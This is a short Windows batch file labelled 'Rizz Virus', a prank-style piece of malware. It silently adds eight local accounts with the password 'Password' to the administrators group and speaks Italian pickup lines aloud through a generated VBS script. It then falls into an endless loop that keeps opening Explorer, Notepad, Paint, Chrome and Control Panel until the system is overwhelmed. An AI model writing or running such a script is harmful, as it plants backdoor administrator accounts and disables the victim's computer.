 
@echo off 
 net user fgijgr Password /add
 net localgroup administrators fgijgr /add
 net user lesgoski Password /add
 net localgroup administrators lesgoski /add
 net user scem Password /add
 net localgroup administrators scem /add
 net user ùòòòàè Password /add
 net localgroup administrators ùòòòàè /add
 net user kebab Password /add
 net localgroup administrators kebab /add
 net user bomboclat Password /add
 net localgroup administrators bomboclat /add
 net user bombayah Password /add
 net localgroup administrators bombayah /add
net user 1+1fa2 Password /add
 net localgroup administrators 1+1fa2 /add
title Rizz Virus
color F

:start
set text="Ciao, stai per essere rimorchiatp"
echo %text%
echo set speech = Wscript.CreateObject("SAPI.spVoice") > speech.vbs
echo speech.speak %text% >> speech.vbs
start speech.vbs

call :Attack "Hai un nome o posso chiamarti mio?"
call :Attack "I tuoi occhi sono come un oceano, e io sono perso in mare."
call :Attack "Se la bellezza fosse un crimine, staresti scontando una condanna a vita."
call :Attack "Sei un viaggiatore del tempo? Perche ti vedo nel mio futuro."
call :Attack "Sei una macchina fotografica? Perche ogni volta che ti guardo, sorrido."


:attack
cls
echo %~1
echo set speech = Wscript.CreateObject("SAPI.spVoice") > speech.vbs
echo speech.speak "%~1" >> speech.vbs
start speech.vbs
timeout 5 >nul


echo off
:x
start explorer
start notepad
start mspaint
start chrome
start control
goto x
:shutdown /s /t 5
